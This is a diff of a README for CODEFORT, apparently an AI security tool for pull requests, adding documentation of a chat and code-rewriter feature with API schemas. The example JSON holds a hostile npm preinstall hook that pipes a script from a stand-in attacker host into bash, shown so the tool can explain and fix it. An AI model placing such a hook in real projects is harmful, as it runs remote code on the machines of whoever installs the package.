@@ -4,7 +4,7 @@
 [![Web Dashboard](https://img.shields.io/badge/Web_Dashboard-Vercel_Live-00ff66?style=flat-square&logo=vercel)](https://codefort-web.vercel.app)
 [![FastAPI Engine](https://img.shields.io/badge/FastAPI_Engine-Vercel_Live-00e5ff?style=flat-square&logo=fastapi)](https://codefort-lilac.vercel.app/docs)
 [![License](https://img.shields.io/badge/License-Apache_2.0-blue?style=flat-square)](LICENSE)
-[![Python Tests](https://img.shields.io/badge/Pytest-78%20Passed%20(100%25)-00ff66?style=flat-square&logo=python)](services/api/tests/)
+[![Python Tests](https://img.shields.io/badge/Pytest-82%20Passed%20(100%25)-00ff66?style=flat-square&logo=python)](services/api/tests/)
 [![OSV Benchmark](https://img.shields.io/badge/OSV_Evaluation-20%2F20%20(100%25)-00e5ff?style=flat-square)](services/api/datasets/evaluation/barqai_test.jsonl)
 
 > **Next-generation AI security platform that intercepts malicious pull requests, detects software supply chain poisoning, and prevents CI/CD workflow injection attacks before code merges into production. Powered by Barq-AI with unified frontier intelligence (Qwen 2.5 Coder MoE / Qwen3.8-Max + Google Gemini), concrete OSV evidence grounding, deterministic backend risk scoring, and autonomous 1-click patch verification.**
@@ -150,6 +150,7 @@ flowchart TD
 
     subgraph Web["Web Dashboard (Next.js 14)"]
         Dash["/dashboard — Multi-Repo PR Scans"]
+        ChatView["/chat — BARQAI Chat & Code Rewriter"]
         Foren["/scans/[id] — Forensics & 1-Click Verified Fixes"]
         DiffView["Side-by-Side & Unified Diff Viewers"]
         Sett["/settings — Extension Pairing Tokens"]
@@ -173,6 +174,7 @@ flowchart TD
     RemedRouter --> Drawer
     RemedRouter --> Foren
     Foren --> DiffView
+    ChatView <-->|Interactive Q&A & Rewriting| BARQ
 
     Web <-->|Single-Use Token Pairing| Popup
 ```
@@ -292,6 +294,71 @@ Configure these repository permissions in [GitHub Developer Settings — Apps](h
 - Remove unvetted curl|sh execution from package.json lifecycle scripts immediately.
 - Replace 'lodashe' with the authentic package 'lodash'.
 - Review proposed 1-click patch in CODEFORT Patch Studio.
+```
+
+---
+
+## 💬 Phase 7: Interactive BARQAI Chat & Code Rewriter Studio (`/chat`)
+
+CODEFORT includes an interactive conversational security copilot and automated code rewriter powered by **BARQAI** (Qwen 2.5 Coder MoE / Qwen3.8-Max with zero-downtime deterministic fallback).
+
+Developers can chat directly with BARQAI about project vulnerabilities, CI/CD misconfigurations, or suspicious dependencies. BARQAI analyzes the error, explains the root cause and attack vectors, and synthesizes a hardened, production-ready replacement with a unified git diff.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 💬 BARQAI COPILOT // ERROR DIAGNOSTICS & CODE REWRITER                      │
+├──────────────────────────────────────┬──────────────────────────────────────┤
+│ 👤 USER INPUT & CONTEXT              │ 🤖 BARQAI RESPONSE                   │
+│                                      │                                      │
+│ Error: "Preinstall dropper curl|sh"  │ 📖 Root Cause & Threat Vector        │
+│ Code:  {"preinstall": "curl ..."}    │ 🛠️ Hardened Rewritten Code           │
+│                                      │ ⇄ Unified Git Diff (diff -u)         │
+└──────────────────────────────────────┴──────────────────────────────────────┘
+```
+
+### 1. Three Ways Developers Can Access BARQAI Chat
+1. **Dedicated Full-Screen IDE Copilot (`/chat`)**:
+   - Access via `/chat` or navbar link `/04 BARQAI CHAT`.
+   - Includes quick-load scenario templates:
+     - `⚡ Preinstall Dropper` (eliminates unvetted network execution in `package.json`).
+     - `🎯 Dependency Typosquat` (replaces spoofed libraries with authentic upstream packages).
+     - `🛡️ Workflow Injection` (remediates `pull_request_target` fork checkout vulnerabilities).
+     - `Custom Vulnerability & Error Analysis` (paste arbitrary code or stack traces).
+   - Side-by-side inspection: **Original Code** vs. **Rewritten Code** vs. **Unified Git Diff**.
+2. **Context-Aware Modal in Scan Forensics (`/scans/[id]`)**:
+   - Every security finding card features a `💬 CHAT WITH BARQAI` button.
+   - Clicking auto-populates the exact finding title, severity, file path, and code context into a slide-over chat modal.
+3. **Quick-Action Global Navbar Button**:
+   - `💬 CHAT WITH BARQAI` button available across all pages for rapid diagnostic queries.
+
+### 2. Backend Chat API Endpoints
+| Endpoint | Method | Description |
+| :--- | :---: | :--- |
+| `/api/v1/barqai/chat` | `POST` | Core chat endpoint with Qwen MoE reasoning, code rewriting, and unified diff synthesis |
+| `/api/v1/chat` | `POST` | Direct alias route for rapid developer tool integrations |
+
+#### Request Schema
+```json
+{
+  "message": "Explain why this preinstall script is dangerous and rewrite package.json safely",
+  "error_context": "Remote dropper execution in lifecycle hook (curl | bash)",
+  "code_snippet": "{\n  \"scripts\": {\n    \"preinstall\": \"curl -sL http://attacker.xyz/drop.sh | bash\"\n  }\n}",
+  "file_path": "package.json",
+  "scan_id": "optional-scan-uuid",
+  "history": []
+}
+```
+
+#### Response Schema
+```json
+{
+  "reply": "BARQAI Security Analysis & Safe Rewrite complete...",
+  "explanation": "The preinstall script downloads and pipes unvetted remote bash scripts into bash with root privileges during 'npm install'...",
+  "rewritten_code": "{\n  \"scripts\": {\n    \"build\": \"npm run compile\"\n  }\n}",
+  "original_code": "{\n  \"scripts\": {\n    \"preinstall\": \"curl -sL http://attacker.xyz/drop.sh | bash\"\n  }\n}",
+  "diff": "--- package.json (original)\n+++ package.json (hardened)\n@@ -1,3 +1,3 @@\n...",
+  "model": "qwen/qwen-2.5-coder-32b-instruct"
+}
 ```
 
 ---
